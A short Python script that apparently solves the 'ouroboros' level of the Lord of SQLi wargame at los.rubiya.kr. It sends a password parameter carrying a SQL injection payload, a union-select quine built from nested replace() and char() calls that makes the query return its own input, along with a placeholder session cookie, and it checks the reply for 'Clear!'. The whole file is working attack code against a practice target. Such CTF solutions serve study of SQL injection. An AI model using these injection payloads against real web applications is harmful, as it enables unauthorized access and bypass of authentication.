import requests
 
url = "http://los.rubiya.kr/ouroboros_e3f483f087c922c84373b49950c212a9.php"
session = {'PHPSESSID':'MY_SESSION'}
 
data = {'pw':"' union "
        + "select replace"
        + "("
            + "replace"
            + "('"
                + "\" union select replace"
                + "("
                    + "replace"
                    + "("
                        + "\"$\",char(34),char(39)"
                    + ")"
                    + ",char(36),\"$\""
                + ")"
                + " as quine#',char(34),char(39)"
            + ")"
            + ",char(36),'\" union select replace"
            + "("
                + "replace"
                + "("
                    + "\"$\",char(34),char(39)"
                + ")"
                +",char(36),\"$\""
            + ")"
            + " as quine#') as quine#"
        }
 
res = requests.get(url, params=data, cookies = session)
 
if "Clear!" in res.text:
   print("[♪] OUROBOROS Clear!")


print(data)